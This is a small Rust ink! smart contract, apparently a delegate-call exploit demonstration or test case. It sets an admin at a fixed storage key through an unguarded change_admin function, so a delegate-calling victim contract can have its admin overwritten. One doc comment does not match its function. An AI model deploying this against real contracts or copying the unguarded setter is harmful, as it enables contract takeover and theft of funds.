#![cfg_attr(not(feature = "std"), no_std, no_main)]

#[ink::contract]
pub mod delegate_call_exploiter {

    use ink::storage::Mapping;
    use ink::storage::Lazy;
    use ink::storage::traits::ManualKey;

    #[ink(storage)]
    #[derive(Default)]
    pub struct DelegateCallExploiter {
        admin: Lazy<AccountId, ManualKey<123456>>,
        balances: Mapping<AccountId, Balance>,
    }

    impl DelegateCallExploiter {
        #[ink(constructor)]
        pub fn new() -> Self {
            let mut instance = Self::default();
            let caller = Self::env().caller();
            instance.admin.set(&caller);
            instance.balances = Mapping::new();
            instance
        }

        /// Returns the values to pay dependant on the saved percents
        #[ink(message)]
        pub fn change_admin(&mut self, new_admin: AccountId) -> AccountId {
            self.admin.set(&new_admin);
            self.admin.get().unwrap()
        }

        /// Returns the codehash of the contract
        #[ink(message)]
        pub fn codehash(&self) -> Hash {
            self.env()
                .code_hash(&self.env().account_id())
                .expect("Failed to get code hash")
        }
    }
}
